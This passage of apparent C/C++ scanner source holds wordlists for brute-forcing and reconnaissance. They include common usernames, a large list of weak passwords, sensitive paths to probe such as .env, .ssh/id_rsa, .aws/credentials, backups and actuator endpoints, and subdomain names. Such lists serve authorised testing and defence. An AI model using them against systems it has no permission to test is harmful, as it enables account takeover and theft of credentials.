noperator1\noperator01\noperator10\noperator99\nadmin_default\nsystem_default\ndefault_admin\ndefault_user\ndefault_test\ndefault_root\ndefault1\ndefault01\ndefault10\ndefault99\nadmin_test\ntest_admin\ntest_user\nadmin_user\nuser_test\nuser_admin\nadmin_root\nadmin_system\nadmin_login\nlogin_admin\nlogin_test\nlogin_user\nlogin_default\ndefault_login\nadmin_account\naccount_admin\naccount_test\naccount_user\nadmin_dba\ndba_admin\ndba_test\ndba_user\ndba_default\ndefault_dba\ndba1\ndba2\ndba3\ndba01\ndba10\ndba99\nadmin_dev\ndev_admin\ndev_test\ndev_user\ndev_default\ndefault_dev\nadmin_qa\nqa_admin\nqa_test\nqa_user\nqa_default\ndefault_qa\nadmin_stage\nstage_admin\nstage_test\nstage_user\nstage_default\ndefault_stage\nadmin_prod\nprod_admin\nprod_test\nprod_user\nprod_default\ndefault_prod\nadmin_release\nrelease_admin\nrelease_test\nrelease_user\nadmin_beta\nbeta_admin\nbeta_test\nbeta_user\nadmin_alpha\nalpha_admin\nalpha_test\nalpha_user\nadmin_rc\nrc_admin\nrc_test\nrc_user\ngeneral\nbasicuser\nstandarduser\npremiumuser\ngolduser\nvipuser\nfreeuser\ntrialuser\nbetauser\nalphauser\nrcuser\ndev1\ndev2\ndev3\ndev4\ndev5\nqa1\nqa2\nqa3\nstage1\nstage2\nstage3\nprod1\nprod2\nprod3\nrelease1\nrelease2\nbeta1\nbeta2\nalpha1\nalpha2\nrc1\nrc2\noracle1\noracle01\npostgres1\npostgres01\nmysql1\nmysql01\nsqlserver1\nsqlserver01\nsa1\nsa01\nweblogic1\nweblogic01\nwebsphere1\nwebsphere01\ntomcat1\ntomcat01\njboss1\njboss01\nmongo1\nmongo01\nredis1\nredis01\ncouchdb1\ncouchdb01\nelasticsearch1\nelasticsearch01\nmemcache1\nmemcache01\ncassandra1\ncassandra01\nrabbitmq1\nrabbitmq01\nactivemq1\nactivemq01\nzookeeper1\nzookeeper01\nkafka1\nkafka01\nstorm1\nstorm01\nspark1\nspark01\nhadoop1\nhadoop01\nhdfs1\nhdfs01\nyarn1\nyarn01\nhbase1\nhbase01\nhive1\nhive01\npig1\npig01\nimpala1\nimpala01\noozie1\noozie01\nhue1\nhue01\nsentry1\nsentry01\nranger1\nranger01\natlas1\natlas01\nzeppelin1\nzeppelin01\njupyter1\njupyter01\nrstudio1\nrstudio01\ndatabricks1\ndatabricks01\nsnowflake1\nsnowflake01\nredshift1\nredshift01\nbigquery1\nbigquery01\ndatabase1\ndatabase01\ndb1\ndb01\ndba1\ndba01\nweb1\nweb01\nwww1\nwww01\napp1\napp01\nmanager1\nmanager01\nsecretary1\nsecretary01\ndemo1\ndemo01\ndaemon1\ndaemon01\nbin1\nbin01\nnobody1\nnobody01\noperator1\noperator01\nftp1\nftp01\nmail1\nmail01\nsmtp1\nsmtp01\npop3_1\npop3_01\nimap1\nimap01\ndns1\ndns01\nnamed1\nnamed01\nbind1\nbind01\nlist1\nlist01\nirc1\nirc01\nnews1\nnews01\nman1\nman01\nproxy1\nproxy01\nlp1\nlp01\nuucp1\nuucp01\nrpm1\nrpm01\napache1\napache01\nhttpd1\nhttpd01\nnginx1\nnginx01\nlighttpd1\nlighttpd01\ngames1\ngames01\nmaster\nslave\nclone\nmirror\nstandby\nreplica\nshard\ncluster\nleader\nfollower\nworker\nbroker\nrouter\ngateway\nedge\ncore\nrelay\nproxy01\nbackup01\nbackup1\nbackupuser\nbackupadmin\nrescue\nemergency\nbreakglass\nbreak_glass\nbreakadmin\nemergencyadmin\nrescueadmin\nfirstboot\nfirstuser\nsetup\nsetupuser\nsetupadmin\ninstaller\ninstall\ninstall_admin\nadminadmin1\ntestadmin\ntestroot\ntestguest\ntestoperator\ntestmail\ntestdba\ntestmanager\ntestsa\ntestoracle\ntestpostgres\ntestmysql\ntestsqlserver\ntestweblogic\ntestwebsphere\ntesttomcat\ntestjboss\ntestmongo\ntestredis\ntestcouchdb\ntestelasticsearch\ntestmemcache\ntestcassandra\ntestrabbitmq\ntestactivemq\ntestzookeeper\ntestkafka\nadmin_master\nmaster_admin\nadmin_slave\nslave_admin\nclone_admin\nadmin_clone\nadmin_mirror\nmirror_admin\nadmin_standby\nstandby_admin\nadmin_replica\nreplica_admin\nadmin_shard\nshard_admin\nadmin_cluster\ncluster_admin\nadmin_leader\nleader_admin\nadmin_follower\nfollower_admin\nadmin_worker\nworker_admin\nadmin_broker\nbroker_admin\nadmin_router\nrouter_admin\nadmin_gateway\ngateway_admin\nadmin_edge\nedge_admin\nadmin_core\ncore_admin\nadmin_relay\nrelay_admin\nadmin_proxy\nproxy_admin\nadmin_backup\nbackup_admin\nadmin_rescue\nrescue_admin\nadmin_emergency\nemergency_admin\nadmin_setup\nsetup_admin\nadmin_install\ninstall_admin\n"
    "x\ny\nz\na\nb\nc\nd\ne\nf\ng\nh\ni\nj\nk\nl\nm\nn\no\np\nq\nr\ns\nt\nu\nv\nw\n"
    "joe@example.com\njohn@example.com\nadmin@example.com\nroot@example.com\nuser@example.com\ntest@example.com\nguest@example.com\nsupport@example.com\nservice@example.com\nsales@example.com\nmarketing@example.com\nhr@example.com\nlegal@example.com\nfinance@example.com\nit@example.com\ndevops@example.com\nsecurity@example.com\ncontact@example.com\ninfo@example.com\nhelp@example.com\nadministrator@example.com\nwebmaster@example.com\npostmaster@example.com\nhostmaster@example.com\n"
    ;

static const char* kAuthPasswordsTop1000 =
    "password\n123456\n12345678\n123456789\nqwerty\nabc123\nletmein\nmonkey\n1234567890\ndragon\nbaseball\niloveyou\ntrustno1\n1234567\nsunshine\nmaster\n123123\nwelcome\nshadow\nashley\nfootball\njesus\nmichael\nninja\nmustang\npassword1\npassword123\nadmin\nadmin123\nroot\nroot123\nguest\nguest123\nuser\nuser123\ntest\ntest123\noracle\nmysql\npostgres\nsa\nsqlserver\nsupport\nlogin\nchangeme\nchange_me\ndefault\nsystem\nadministrator\nP@ssw0rd\nP@ssword\nPassword1\nPassword123\nPassword\npassword!\nPassword!\nP@ssword1\nP@ssw0rd1\nadmin@123\nroot@123\nuser@123\ntest@123\noracle@123\nmysql@123\npostgres@123\nadmin#123\nroot#123\nadmin1\nadmin12\nadmin1234\nroot1\nroot12\nroot1234\nP@ssw0rd!\nP@ssword!\nP@ssword123\nP@ssw0rd123\nP@ssword!23\nP@ssw0rd!23\nadmin!23\nadmin!@#\nQwerty123\nqwerty123\nqwerty1\nqwerty12\nqwerty1234\nqwertyuiop\nasdfgh\nasdfghjkl\nzxcvbn\nzxcvbnm\n!@#$%^&*\n!@#$%^&*()\n!QAZ@WSX\n!QAZ2wsx\nQwerty!\nQ1w2e3r4\nq1w2e3r4\nq1w2e3r4t5\nQ1w2e3r4t5\nq1w2e3r4t5y6\nQ1w2e3r4t5y6\nq1w2e3\nQ1w2e3\nq1w2\nQ1w2\nq1w2e3r4!\nQ1w2e3r4!\nadmin2024\nadmin2023\nadmin2022\nadmin2021\nadmin2020\nadmin2019\nadmin2018\nadmin2017\nadmin2016\nadmin2015\nroot2024\nroot2023\nroot2022\nroot2021\nroot2020\nWelcome1\nWelcome123\nWelcome2024\nWelcome2023\nWelcome2022\nWelcome2021\nwelcome1\nwelcome123\nwelcome2024\nWinter2024\nSpring2024\nSummer2024\nAutumn2024\nFall2024\nWinter2023\nSpring2023\nSummer2023\nAutumn2023\nFall2023\nJanuary2024\nFebruary2024\nMarch2024\nApril2024\nMay2024\nJune2024\nJuly2024\nAugust2024\nSeptember2024\nOctober2024\nNovember2024\nDecember2024\nCompany2024\nCompany123\nCompany!23\nbackup\nbackup1\nbackup123\nbackupbackup\nfirewall\nfirewall1\nfirewall123\nrouter\nrouter1\nrouter123\nswitch\nswitch1\nswitch123\ndmz\ndmz1\ndmz123\nvpn\nvpn1\nvpn123\nvpnuser\nvpnadmin\ncisco\ncisco1\ncisco123\nciscocisco\nhp\nhp1\nhp123\nhphp\ndell\ndell1\ndell123\ndelldell\nibm\nibm1\nibm123\nibmibm\noracle1\noracle12\noracle123\noraclesoracle\nmysql1\nmysql12\nmysql123\nmysqlmysql\npostgres1\npostgres12\npostgres123\npostgrespostgres\nsa1\nsa12\nsa123\nsasa\nsqlserver1\nsqlserver12\nsqlserver123\nsqlserversqlserver\nsupport1\nsupport12\nsupport123\nsupportsupport\nlogin1\nlogin12\nlogin123\nloginlogin\nchangeme1\nchangeme12\nchangeme123\nchangemechangeme\ndefault1\ndefault12\ndefault123\ndefaultdefault\nsystem1\nsystem12\nsystem123\nsystemsystem\nadministrator1\nadministrator12\nadministrator123\nadministratoradministrator\nP4ssw0rd\nP@ssw0rd1!\nP@ssw0rd!!\nP@ssw0rd!@#\nP@ssw0rd@123\nadmin!@#$\nroot!@#$\nuser!@#$\ntest!@#$\noracle!@#$\nmysql!@#$\npostgres!@#$\nadmin#@!\nroot#@!\nadmin!#@\nroot!#@\nadmin@!#\nroot@!#\nIloveyou1\nIloveyou123\niloveyou1\niloveyou123\nIlove123\nIlove1\nIlove\nlove\nlove1\nlove123\nlovelove\nlovelove1\nfreedom\nfreedom1\nfreedom123\nfreedomfreedom\nliberty\nliberty1\nliberty123\nlibertyliberty\nsuper\nsuper1\nsuper123\nsupersuper\nsuperman\nsuperman1\nsuperman123\nbatman\nbatman1\nbatman123\nspiderman\nspiderman1\nspiderman123\nfighter\nfighter1\nfighter123\nstarwars\nstarwars1\nstarwars123\nharley\nharley1\nharley123\nmaster1\nmaster123\nmastermaster\ndragon1\ndragon123\ndragondragon\nbaseball1\nbaseball123\nbaseballbaseball\ntrustno11\ntrustno1234\nninja1\nninja123\nninjaninja\nmustang1\nmustang123\nmustangmustang\nasdf\nasdf1234\nasdf123\nasdfasdf\nzxcvb\nzxcvb123\nzxcv\nzxcv123\nqaz\nqaz123\nqazwsx\nqazwsxedc\n1qaz2wsx\n1qaz@WSX\n1qaz!QAZ\n1qaz2wsx3edc\n1qaz!QAZ2wsx@WSX\nQAZWSX\nQAZWSX123\nqazxsw\nqazxsw123\n!QAZxsw2\n!QAZxsw2#EDC\n1q2w3e\n1q2w3e4r\n1q2w3e4r5t\n1q2w3e4r5t6y\n1q2w3e!\n1Q2w3e!\n1Q2W3E\n1Q2W3E4R\n1234\n5678\n0000\n1111\n2222\n3333\n4444\n5555\n6666\n7777\n8888\n9999\n11111111\n22222222\n00000000\n88888888\n99999999\ndefault1234\nchangeme1234\nP@ssword123!\nP@ssw0rd!23\nP@ssw0rd@!#\nP@ssw0rd123!\nP@ssword1!\nP@ssword!1\nP@ssword!!\nP@ssword@123\nP@ssword!@#\nletmein1\nletmein123\nletmeinplease\nopen\nopen1\nopen123\nopenopen\nopensesame\ncloseme\ncloseme1\ncloseme123\nclosed\nclosed1\nclosed123\nclosedclose\nallowed\nallowed1\nallowed123\nallowedallowed\nblocked\nblocked1\nblocked123\nblockedblocked\nrejected\nrejected1\nrejected123\nrejectedrejected\nfree\nfree1\nfree123\nfreefree\ntrial\ntrial1\ntrial123\ntrialtrial\nbeta\nbeta1\nbeta123\nbetabeta\nalpha\nalpha1\nalpha123\nalphaalpha\nrc\nrc1\nrc123\nrcrc\nstable\nstable1\nstable123\nstablestable\nrelease\nrelease1\nrelease123\nreleaserelease\nprod\nprod1\nprod123\nprodprod\nproduction\nproduction1\nproduction123\nstaging\nstaging1\nstaging123\nstage\nstage1\nstage123\nstagestage\ntest!@#\ntest!23\ntest!@#$\ntest@123\ntest@123!\ntest123!\ntest1234!\ntesttest\ntest_user\ntestuser\ntester\ntester1\ntester123\nguest!@#\nguest@123\nguest123!\nguest1234!\nguestguest\nguest_user\nguestuser\nopensesame!\nopensesame123\nopensesame1\nopensesame@123\nadmin@2024\nadmin@2023\nadmin@2022\nadmin@2021\nadmin@2020\nroot@2024\nroot@2023\nroot@2022\nroot@2021\nroot@2020\nWelcome@2024\nWelcome@2023\nWelcome@2022\nWelcome@2021\nWelcome@2020\nP@ssw0rd@2024\nP@ssw0rd@2023\nP@ssw0rd@2022\nP@ssw0rd@2021\nP@ssw0rd@2020\nWinter@2024\nWinter@2023\nWinter@2022\nWinter@2021\nWinter@2020\nSpring@2024\nSpring@2023\nSpring@2022\nSpring@2021\nSpring@2020\nSummer@2024\nSummer@2023\nSummer@2022\nSummer@2021\nSummer@2020\nAutumn@2024\nAutumn@2023\nAutumn@2022\nAutumn@2021\nAutumn@2020\nFall@2024\nFall@2023\nFall@2022\nFall@2021\nFall@2020\nCompany@2024\nCompany@2023\nCompany@2022\nCompany@2021\nCompany@2020\nbackup@2024\nbackup@2023\nbackup@2022\nbackup@2021\nbackup@2020\nfirewall@2024\nfirewall@2023\nfirewall@2022\nfirewall@2021\nfirewall@2020\nrouter@2024\nrouter@2023\nrouter@2022\nrouter@2021\nrouter@2020\nswitch@2024\nswitch@2023\nswitch@2022\nswitch@2021\nswitch@2020\ndmz@2024\ndmz@2023\ndmz@2022\ndmz@2021\ndmz@2020\nvpn@2024\nvpn@2023\nvpn@2022\nvpn@2021\nvpn@2020\ncisco@2024\ncisco@2023\ncisco@2022\ncisco@2021\ncisco@2020\nhp@2024\nhp@2023\nhp@2022\nhp@2021\nhp@2020\ndell@2024\ndell@2023\ndell@2022\ndell@2021\ndell@2020\nibm@2024\nibm@2023\nibm@2022\nibm@2021\nibm@2020\noracle@2024\noracle@2023\noracle@2022\noracle@2021\noracle@2020\nmysql@2024\nmysql@2023\nmysql@2022\nmysql@2021\nmysql@2020\npostgres@2024\npostgres@2023\npostgres@2022\npostgres@2021\npostgres@2020\nsa@2024\nsa@2023\nsa@2022\nsa@2021\nsa@2020\nsqlserver@2024\nsqlserver@2023\nsqlserver@2022\nsqlserver@2021\nsqlserver@2020\nsupport@2024\nsupport@2023\nsupport@2022\nsupport@2021\nsupport@2020\nadmin_default\nroot_default\nuser_default\ntest_default\nguest_default\nsupport_default\nservice_default\noracle_default\nmysql_default\npostgres_default\nsa_default\nsqlserver_default\nadmin_changeme\nroot_changeme\nuser_changeme\ntest_changeme\nguest_changeme\nsupport_changeme\nservice_changeme\noracle_changeme\nmysql_changeme\npostgres_changeme\nsa_changeme\nsqlserver_changeme\nadmin_default1\nadmin_default123\nroot_default1\nroot_default123\nuser_default1\nuser_default123\ntest_default1\ntest_default123\nguest_default1\nguest_default123\nadmin_changeme1\nadmin_changeme123\nroot_changeme1\nroot_changeme123\nuser_changeme1\nuser_changeme123\ntest_changeme1\ntest_changeme123\nguest_changeme1\nguest_changeme123\nP@ssword_default\nP@ssword_default1\nP@ssword_default123\nP@ssword_changeme\nP@ssword_changeme1\nP@ssword_changeme123\n"
    ;

static const char* kDirsCommon100 =
    "admin\nadmin/\nadministrator\nadministrator/\nphpmyadmin\nphpmyadmin/\nlogin\nlogin/\nwp-admin\nwp-admin/\nwp-login.php\ncpanel\ncpanel/\nwebmail\nwebmail/\nuser\nuser/\nuserlogin\nlogon\nlogon/\nbackup\nbackup/\nbackups\nbackups/\nold\nold/\nbak\nbak/\nbackup.zip\nbackup.tar.gz\nbackup.sql\nbackup.bak\nweb.config\n.env\n.git/\n.git/HEAD\n.git/config\n.git/index\n.svn/\n.htaccess\n.htpasswd\n.DS_Store\nrobots.txt\nsitemap.xml\nsitemap.xml.gz\nserver-status\nserver-info\nphpinfo.php\ninfo.php\ntest.php\nconfig.php\nconfig.php.bak\nconfig.ini\nconfig.inc.php\nconfig.json\nconfig.yml\nconfig.yaml\nweb.config.bak\n.travis.yml\n.gitignore\n.gitlab-ci.yml\n.dockerignore\ndocker-compose.yml\nDockerfile\npackage.json\npackage-lock.json\nyarn.lock\ncomposer.json\ncomposer.lock\nGemfile\nGemfile.lock\nrequirements.txt\nmanifest.json\nappspec.yml\napi\napi/\napi/v1\napi/v2\nv1\nv2\nrest\nrest/\ngraphql\ngraphql/\nswagger\nswagger.json\nswagger-ui\nswagger-ui/\nopenapi.json\nactuator\nactuator/\nactuator/env\nactuator/health\nactuator/info\nactuator/metrics\nactuator/heapdump\nmetrics\nstatus\nhealth\nhealthcheck\nready\nupload\nuploads\nuploads/\ndownload\ndownloads\ndownloads/\ntmp\ntmp/\ntemp\ntemp/\ncache\ncache/\nlog\nlogs\nlogs/\ndebug\ndebug.log\nerror.log\naccess.log\ntest\ntest/\nstaging\nstaging/\nbeta\nbeta/\ndev\ndev/\nold-site\nold-site/\nlegacy\nlegacy/\n";

static const char* kDirsQuickhits =
    ".git/HEAD\n.git/config\n.git/index\n.git/logs/HEAD\n.git/COMMIT_EDITMSG\n.svn/entries\n.svn/wc.db\n.hg/store/00manifest.i\n.bzr/checkout/dirstate\n.DS_Store\n.env\n.env.local\n.env.production\n.env.development\n.env.example\n.env.backup\n.env.bak\n.env.save\n.env.old\n.env.orig\n.htaccess\n.htpasswd\n.bash_history\n.zsh_history\n.python_history\n.sh_history\n.mysql_history\n.psql_history\n.netrc\n.ssh/id_rsa\n.ssh/authorized_keys\n.ssh/known_hosts\n.ssh/config\n.aws/credentials\n.aws/config\n.kube/config\n.docker/config.json\n.npmrc\n.yarnrc\n.bashrc\n.profile\nweb.config\nweb.config.bak\nweb.config.old\nweb.config.orig\nweb.config.save\nweb.config~\napp.config\napp.config.bak\nconfig.json\nconfig.json.bak\nconfig.xml\nconfig.xml.bak\nconfig.yml\nconfig.yaml\nconfig.ini\nconfig.toml\nconfig.cfg\nconfig.conf\nconfig.php\nconfig.php.bak\nconfig.php.old\nconfig.php~\nconfig.inc.php\nconfig.inc.php.bak\nsettings.json\nsettings.xml\nsettings.yml\nsettings.yaml\nsettings.ini\nsettings.toml\nsettings.cfg\nsettings.conf\nsettings.php\nsettings.php.bak\ncredentials.json\ncredentials.xml\ncredentials.yml\ncredentials.yaml\ncredentials.ini\ncredentials.toml\ncredentials.cfg\ncredentials.conf\ncredentials.php\nsecrets.json\nsecrets.xml\nsecrets.yml\nsecrets.yaml\nsecrets.ini\nsecrets.toml\nsecrets.cfg\nsecrets.conf\nsecrets.php\nphpinfo.php\ninfo.php\ntest.php\nshell.php\nupload.php\nfile.php\nbackup.sql\nbackup.tar.gz\nbackup.zip\nbackup.tar\nbackup.gz\nbackup.tgz\nbackup.7z\nbackup.rar\nbackup.bak\nbackup.bak.zip\nbackup.bak.tar.gz\ndump.sql\ndump.sql.gz\ndump.sql.zip\ndatabase.sql\ndatabase.sql.gz\ndb.sql\ndb.sql.gz\ndev.sql\ndev.sql.gz\nprod.sql\nprod.sql.gz\nstage.sql\nstage.sql.gz\ndata.sql\ndata.sql.gz\nmysqldump.sql\nmysqldump.sql.gz\npg_dump.sql\npg_dump.sql.gz\nold/\nbak/\nbackup/\nbackups/\narchive/\narchives/\ntmp/\ntemp/\ncache/\nlog/\nlogs/\nstaging/\ndev/\nbeta/\nlegacy/\ntest/\ndebug/\nadmin/\nadmin/login.php\nadmin/index.php\nadmin/config.php\nadmin/login\nadmin/index\nadmin/config\nadministrator/\nphpmyadmin/\nphpmyadmin/index.php\nphpmyadmin/scripts/setup.php\nadminer.php\ncpanel/\nwhm/\nwebmail/\nrobots.txt\nsitemap.xml\nsitemap.xml.gz\nserver-status\nserver-info\nactuator\nactuator/env\nactuator/health\nactuator/info\nactuator/heapdump\nactuator/threaddump\nactuator/loggers\nactuator/metrics\nactuator/configprops\nactuator/mappings\nactuator/beans\nactuator/auditevents\nactuator/conditions\nactuator/scheduledtasks\nactuator/sessions\nactuator/caches\nactuator/httptrace\nactuator/jolokia\nactuator/refresh\nactuator/restart\nactuator/shutdown\n.idea/\n.idea/workspace.xml\n.vscode/\n.vscode/settings.json\nThumbs.db\nDesktop.ini\ndesktop.ini\n";

static const char* kDirsBig =
    "admin\nadministrator\nlogin\nlogon\nuser\nusers\nphpmyadmin\nadminer\nwp-admin\nwp-login.php\nwp-config.php\nwp-content\nwp-includes\ncpanel\nwhm\nwebmail\nmail\nuserlogin\nuserlogin.aspx\nlogin.aspx\nadmin.aspx\nadministrator.aspx\nlogin.php\nadmin.php\nadministrator.php\nlogin.html\nadmin.html\nadministrator.html\nbackup\nbackups\narchive\narchives\nold\nold_site\nold-site\nbak\nbaks\nbackup.zip\nbackup.tar.gz\nbackup.tar\nbackup.gz\nbackup.tgz\nbackup.7z\nbackup.rar\nbackup.sql\nbackup.bak\nbackup.bak.zip\nbackup.bak.tar.gz\ndump.sql\ndump.sql.gz\ndatabase.sql\ndb.sql\nweb.config\n.env\n.git\n.git/HEAD\n.git/config\n.git/index\n.git/logs/HEAD\n.git/COMMIT_EDITMSG\n.svn\n.svn/entries\n.svn/wc.db\n.hg\n.bzr\n.htaccess\n.htpasswd\n.DS_Store\nrobots.txt\nsitemap.xml\nsitemap.xml.gz\nserver-status\nserver-info\nphpinfo.php\ninfo.php\ntest.php\nconfig.php\nconfig.php.bak\nconfig.ini\nconfig.inc.php\nconfig.json\nconfig.yml\nconfig.yaml\nconfig.xml\nweb.config.bak\nweb.config.old\nweb.config.orig\napp.config\napp.config.bak\n.travis.yml\n.gitignore\n.gitlab-ci.yml\n.dockerignore\ndocker-compose.yml\nDockerfile\npackage.json\npackage-lock.json\nyarn.lock\ncomposer.json\ncomposer.lock\nGemfile\nGemfile.lock\nrequirements.txt\nmanifest.json\nappspec.yml\napi\napi/v1\napi/v2\nv1\nv2\nrest\ngraphql\nswagger\nswagger.json\nswagger-ui\nopenapi.json\nactuator\nactuator/env\nactuator/health\nactuator/info\nactuator/metrics\nactuator/heapdump\nactuator/threaddump\nactuator/loggers\nactuator/mappings\nactuator/configprops\nactuator/beans\nactuator/auditevents\nactuator/conditions\nactuator/scheduledtasks\nactuator/sessions\nactuator/caches\nactuator/httptrace\nactuator/jolokia\nactuator/refresh\nactuator/restart\nactuator/shutdown\nmetrics\nstatus\nhealth\nhealthcheck\nready\nupload\nuploads\ndownload\ndownloads\ntmp\ntemp\ncache\nlog\nlogs\ndebug\ndebug.log\nerror.log\naccess.log\ntest\nstaging\nbeta\ndev\nlegacy\nlive\npublic\nprivate\ninternal\nexternal\nsecure\nsecret\ntop-secret\nrestricted\nintranet\nportal\ndashboard\ncontrol\ncontrolpanel\ncpanel\nwebadmin\nhostadmin\nsysadmin\nsuperadmin\nsuperuser\nsudo\nsudoers\naccount\naccounts\nauth\nauthentication\nauthorize\nauthorization\noauth\noauth2\nopenid\nopenid-connect\nsaml\nsso\nfederation\nfederate\nfederated\nfederate_login\nfederate-login\nfederation_login\nfederation-login\nsignin\nsignup\nregister\nregistration\nrecover\nrecovery\npasswordreset\npassword-reset\npassword_reset\nforgot\nforgotpassword\nforgot-password\nforgot_password\nreset\nresetpassword\nreset-password\nreset_password\nverify\nverification\nactivate\nactivation\nconfirm\nconfirmation\nresend\nresend-confirmation\nresend_confirmation\nemail-verification\nemail_verification\nphone-verification\nphone_verification\n2fa\nmfa\ntwo-factor\ntwofactor\ntwo_factor\nmultifactor\nmulti-factor\nmulti_factor\nauthenticator\nauthenticator-app\nyubikey\nfido\nfido2\nwebauthn\nu2f\notp\ntotp\nhotp\nbackup-codes\nbackup_codes\nbackupcodes\nrecovery-codes\nrecovery_codes\nrecoverycodes\nsession\nsessions\ntoken\ntokens\napi-key\napi_key\napikey\napi-keys\napi_keys\napikeys\nbearer\njwt\njwt-token\njwt_token\njwttoken\nrefresh-token\nrefresh_token\nrefreshtoken\naccess-token\naccess_token\naccesstoken\nid-token\nid_token\nidtoken\nuserinfo\nusersession\nuser-session\nuser_session\nuserinfo.json\nuser.json\nusers.json\naccount.json\naccounts.json\nprofile.json\nprofiles.json\nfile\nfiles\nfilemanager\nfile-manager\nfile_manager\nfilemgr\nfilebrowser\nfile-browser\nfile_browser\nfm\nmanager\nmgr\nbrowser\nrouter\nswitch\nfirewall\nproxy\ngateway\nbalancer\nload-balancer\nload_balancer\nloadbalancer\ncluster\nshard\ndatabase\ndb\ndatabases\ndbs\nmongo\nmongodb\nredis\ncouch\ncouchdb\nelastic\nelasticsearch\nmemcache\nmemcached\ncassandra\nrabbitmq\nactivemq\nkafka\nzookeeper\nzeppelin\njupyter\nnotebook\nnotebooks\nrstudio\ndatabricks\nsnowflake\nredshift\nbigquery\noracle\nmysql\npostgres\npostgresql\nsqlserver\nsql\nmssql\nmssqlserver\nmariadb\nsqlite\nsqlite3\nfirebird\ninterbase\ninformix\nsybase\nteradata\nverticadb\nvertica\nclickhouse\ngreenplum\nnetezza\nkdb\nkdbplus\nkdb+\nclickhouse\ndruid\nhdfs\nyarn\nhbase\nhive\npig\nimpala\noozie\nhue\nsentry\nranger\natlas\n";

static const char* kSubdomainsTop1000 =
    "www\nmail\nremote\nblog\nwebmail\nserver\nns1\nns2\nsmtp\nsecure\nvpn\nm\nshop\nftp\nmail2\ntest\nportal\nns\nweb\nadmin\nforum\nnews\nadminis\nintranet\noffice\nbeta\napi\ndev\nimages\nimg\ncdn\nstatic\nassets\nstaging\nstg\nuat\nqa\nproduction\nprod\ndocs\ndoc\ncatalog\nstore\napp\napps\nlogin\nauth\nsso\nidp\nupload\ndownload\nfiles\nbackup\ncloud\ndb\nsql\nmysql\noracle\nelastic\nelasticsearch\nkibana\ngrafana\nprometheus\njenkins\ngitlab\ngit\nbitbucket\ngithub\nsvn\nci\ncd\nbuild\ndeploy\nartifactory\nnexus\nregistry\ndocker\nk8s\nkubernetes\nmonitor\nmonitoring\nstatus\nmetrics\nlogging\nlogs\nlog\nelk\nfluentd\nlogstash\nsentry\nsplunk\ndatadog\nnewrelic\npagerduty\nslack\nzoom\nteams\nmeet\nwebex\njabber\nxmpp\nirc\nchat\nmessenger\nim\nsip\nasterisk\nfreepbx\n3cx\nturnserver\nstun\nturn\nuc\nucpresence\nucvideo\nuc-rooms\nucsignal\nucprovision\nrelay\nrelay1\nrelay2\nrouter\nrouter1\nrouter2\nswitch\nswitch1\nswitch2\nfirewall\nfirewall1\nfirewall2\nfw\nfw1\nfw2\nipv6\nipv4\nipsec\nopenvpn\nwireguard\npptp\nl2tp\nradius\nldap\nopenldap\nactivedirectory\nad\nadds\nadcs\nadfs\nazuread\noidc\nokta\nauth0\nonelogin\nping\npingfederate\npingone\ncas\nyubico\nyubikey\nduo\nfidocompliance\nfido2\nu2f\nwebauthn\nrecaptcha\nhcaptcha\ncloudflare\nakamai\nfastly\nmaxcdn\nstackpath\nincapsula\nimperva\nf5\nf5-bigip\nbigip\nbig-ip\nbigipgtm\nbigipltm\nbigipasm\nbigipafm\nbigipapm\nbigipswg\nbigippsm\nbigipea\nbigipac\nbigipsystem\nbigipdns\nbigipsdcli\nadc\ngslb\nlb\nslb\nbalance\nbalancer\nload-balancer\nload_balancer\nha\nha-proxy\nhaproxy\nnginx\napache\ntomcat\njetty\nundertow\nresin\nweblogic\nwebsphere\nliberty\ngrails\nplay\nrails\nrack\ndjango\nflask\nfastapi\nstarlette\ntornado\npyramid\nbottle\ncherrypy\nturbogears\nweb2py\nsanic\nquart\naiohttp\nfalcon\nhug\napistar\nresponder\nklein\nuvicorn\ndaphne\ngunicorn\nuwsgi\ngevent\ntwisted\nasync\nasync_io\nasyncio\ntrio\ncurio\nanyio\ngevent-mongo\nmongo-engine\nmongoengine\nflask-mongoengine\nflask-mongo\npymongo\nmotor\npymongoarrow\npysolr\npyelasticsearch\nelasticsearch-dsl\nelasticsearch-py\npyes\npyhive\npyhdfs\npyspark\npyspark2\npyspark3\nspark-py\nsparkpython\nsparkpy\npy4j\nschemaorg\nschema-org\nschema_org\nschema\ndatahub\namundsen\nlinkedin\nlnkd\nfacebook\nfb\ntwitter\nx\ntwt\ninstagram\nig\nyoutube\nyt\nvimeo\ntwitch\nreddit\nrd\ndiscord\nstackoverflow\nso\nquora\nquora-com\nquora.com\nquoradigest\nquora-search\nproductionapi\napi-prod\napi-staging\napi-stg\napi-uat\napi-qa\napi-dev\napi-dev1\napi-dev2\napi-test\napi1\napi2\napi3\napi4\napi5\nv1-api\nv2-api\nv3-api\nv1.api\nv2.api\nv3.api\napi.v1\napi.v2\napi.v3\nrest-api\nrest_api\nrestapi\nrestful\nrestful-api\nrestful_api\nrestfulapi\ngraphql-api\ngraphql_api\ngraphqlapi\ngraphql.v1\ngraphql.v2\ngraphql.v3\nws\nwebsocket\nwss\nrt\nrealtime\nlive\nlive-stream\nlivestream\nbroadcast\nstream\nstreaming\nrtmp\nrtsp\nhls\ndash\nwebrtc\nturn1\nturn2\nstun1\nstun2\nice\nuc-rooms-1\nuc-rooms-2\nimg1\nimg2\nimg3\nimg4\nimg5\nimage1\nimage2\nimage3\nimages1\nimages2\nimages3\nstatic1\nstatic2\nstatic3\nstatic4\nstatic5\nassets1\nassets2\nassets3\nassets4\nassets5\ncdn1\ncdn2\ncdn3\ncdn4\ncdn5\nedge\nedge1\nedge2\nedge3\nedge-cdn\nedge_cdn\nedgecdn\npop\npop3\npops\npop3s\nimap\nimaps\nsmtp1\nsmtp2\nsmtps\nsubmission\nmailgateway\nmail-gateway\nmail_gateway\nmail-relay\nmail_relay\nmailrelay\nmx\nmx1\nmx2\nmx3\nmxa\nmxb\nmxc\nspf\ndkim\ndmarc\nbimi\ntrust\ntrust1\ntrust2\nhelpdesk\nsupport\nsupport1\nsupport2\nticket\ntickets\nhelp\nfaq\nkb\nknowledgebase\nknowledge-base\nknowledge_base\nwiki\nconfluence\njira\nyoutrack\nlinear\nasana\ntrello\nclickup\nbasecamp\nmonday\nntfy\npushover\npushbullet\nzapier\nintegromat\nmake\nnode-red\nnodered\nnode_red\nrundeck\nairflow\nprefect\ndagster\nflyte\nmlflow\nkubeflow\nseldon\nseldon-core\nseldoncore\ntorch\ntorchserve\ntorchserveR\ntensorflow\ntensorflow-serving\ntfx\ntfserving\ntf-serving\ntf_serving\ntfx-server\ntfx_server\nray\nray-serve\nray_serve\nrayserve\nbentoml\ncortexlabs\ncortex\ncortex-labs\ncortex_labs\nclearml\nweights-and